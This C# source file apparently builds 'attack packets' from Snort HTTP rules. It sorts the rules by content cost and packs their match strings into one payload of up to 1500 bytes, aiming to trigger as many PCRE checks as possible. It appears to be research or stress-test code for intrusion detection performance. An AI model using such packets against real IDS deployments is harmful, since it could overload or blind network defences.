using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Text.RegularExpressions;
using System.Xml;

namespace PCRETools
{
    class attack_packet
    {
        //--------------------------------------------------------------------------------
        public static byte[] forge_attack_packet(string rules_file = "all_rules_http.rules", int maxsize = 1500)
        {
            string[] rules = File.ReadAllLines(rules_file, Encoding.UTF8);
            List<snort_rule> srules = new List<snort_rule>();
            int rules_scanned = 0;
            int ignored_rules = 0;
            foreach (string rule in rules)
            {
                if (rule.Trim().StartsWith("#")) // skip commented rules
                    continue;

                snort_rule srule = new snort_rule(rule, "");

                rules_scanned++;

                if (srule.IsFlowBits || srule.WithIn > 0)
                {
                    ignored_rules++;
                    continue;
                }

                srules.Add(srule);
            }

            Console.WriteLine("Scanned {0} rules", rules_scanned);
            Console.WriteLine("Ignored {0} rules", ignored_rules);

            if (srules.Count == 0)
            {
                Console.WriteLine("No rules were left after selection");
                return null;
            }

            // sort by price.
            srules.Sort(new Comparison<snort_rule>(delegate(snort_rule A, snort_rule B) { return A.PriceByContent - B.PriceByContent; }));

            // forge a string
            string packet = "";
            int i = 0;
            // length of packet + price of rules + space between contents
            while (i < srules.Count && packet.Length + srules[i].PriceByContent + srules[i].Contents.Length <= maxsize)
            {
                foreach (string content in srules[i].Contents)
                {
                    packet += content;

                    if (packet.Length < maxsize)
                        packet += (char)0xc;
                }

                Console.WriteLine(srules[i].ID);
                i++;
            }

            while (packet.Length < maxsize)
                packet += (char)0xff;

            Console.WriteLine("{0} PCREs should be invoked by this packet", i);

            return Encoding.ASCII.GetBytes(packet);
        }
        //--------------------------------------------------------------------------------
        public static byte[] forge_advanced_attack_packet(string rules_file = "all_rules_http.rules", string pcre_xml_file = "pcres_xml.xml", int maxsize = 1446)
        {
            string[] rules = File.ReadAllLines(rules_file, Encoding.UTF8);
            List<snort_rule> srules = new List<snort_rule>();
            int rules_scanned = 0;
            int ignored_rules = 0;
            XmlDocument doc = new XmlDocument();
            doc.Load(pcre_xml_file);
            foreach (string rule in rules)
            {
                if (rule.Trim().StartsWith("#")) // skip commented rules
                    continue;

                string strrule = Regex.Match(rule, " sid:([0-9]+); ").Groups[1].Value;
                string pcre_xml = doc.SelectSingleNode(string.Format("PCRES/PCRE[@ruleid='{0}']", strrule)).OuterXml;
                snort_rule srule = new snort_rule(rule, pcre_xml);

                rules_scanned++;

                if (srule.IsFlowBits || srule.WithIn > 0)
                {
                    ignored_rules++;
                    continue;
                }

                srules.Add(srule);
            }

            Console.WriteLine("Scanned {0} rules", rules_scanned);
            Console.WriteLine("Ignored {0} rules", ignored_rules);

            if (srules.Count == 0)
            {
                Console.WriteLine("No rules were left after selection");
                return null;
            }

            // sort by price.
            srules.Sort(new Comparison<snort_rule>(delegate(snort_rule A, snort_rule B) { return A.PriceByExactStrings - B.PriceByExactStrings; }));

            // forge a string
            string packet = "";
            int i = 0;
            // length of packet + price of rules + space between contents
            while (i < srules.Count && packet.Length + srules[i].PriceByExactStrings + srules[i].Contents.Length <= maxsize)
            {
                foreach (string content in srules[i].AllExactStrings)
                {
                    packet += content;

                    if (packet.Length < maxsize)
                        packet += " ";
                }

                Console.WriteLine(srules[i].ID);
                i++;
            }

            Console.WriteLine("{0} PCREs should be invoked by this packet", i);

            return Encoding.ASCII.GetBytes(packet);
        }
        //--------------------------------------------------------------------------------
    }
}
